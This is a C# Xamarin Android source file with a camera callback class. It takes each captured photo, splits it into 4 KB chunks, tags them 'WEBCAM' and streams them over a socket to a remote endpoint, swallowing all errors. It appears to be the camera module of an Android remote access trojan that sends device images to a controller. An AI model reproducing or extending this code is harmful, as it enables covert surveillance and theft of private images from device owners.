using Android.Hardware;
using System;
using System.IO;
using System.Net.Sockets;

namespace Task2
{
    class PictureCallback : Java.Lang.Object, Camera.IPictureCallback
    {
        private int _cameraID;
        public Socket socket;
        public PictureCallback(int cameraID, Socket sck)
        {
            socket = sck;
            _cameraID = cameraID;
        }

        public async void OnPictureTaken(byte[] data, Camera camera)
        {
            try
            {
                MemoryStream ms = new MemoryStream();
                using (MemoryStream from = new MemoryStream(data))
                {
                    int readCount;
                    byte[] buffer = new byte[4096]; //4KB chunk
                    while ((readCount = from.Read(buffer, 0, 4096)) != 0)
                    {
                        //if (MainActivity.mySocketConnected == false) { break; }
                        ms.Write(buffer, 0, readCount);
                        byte[] myData = ((MainActivity)MainActivity.global_activity).MyDataPacker("WEBCAM", ms.ToArray(), data.Length.ToString());
                        MainActivity.Soketimiz.BeginSend(myData, 0, myData.Length, SocketFlags.None, null, null);
                        ms.Flush(); ms.Close(); ms.Dispose(); ms = new MemoryStream();

                        await System.Threading.Tasks.Task.Delay(35);
                    }
                    if (ms != null)
                    {
                        ms.Flush(); ms.Close(); ms.Dispose();
                    }
                }

            }
            catch (Exception)
            {
            }
            try
            {

                camera.StopPreview();
                camera.Release();
            }
            catch (Exception) { }

        }
    }
}